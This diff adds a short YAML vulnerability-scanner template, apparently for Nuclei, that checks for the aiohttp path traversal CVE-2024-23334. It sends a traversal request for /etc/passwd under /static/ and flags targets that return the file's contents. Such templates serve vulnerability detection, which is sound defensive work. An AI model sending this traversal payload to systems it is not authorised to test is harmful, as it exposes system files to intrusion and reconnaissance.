@@ -1,0 +1,28 @@
+id: aiohttp-anyfile-read
+
+info:
+  name: aiohttp Arbitrary File Read Vulnerability (CVE-2024-23334)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve, cve-2024-23334, file-read
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/static/../../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
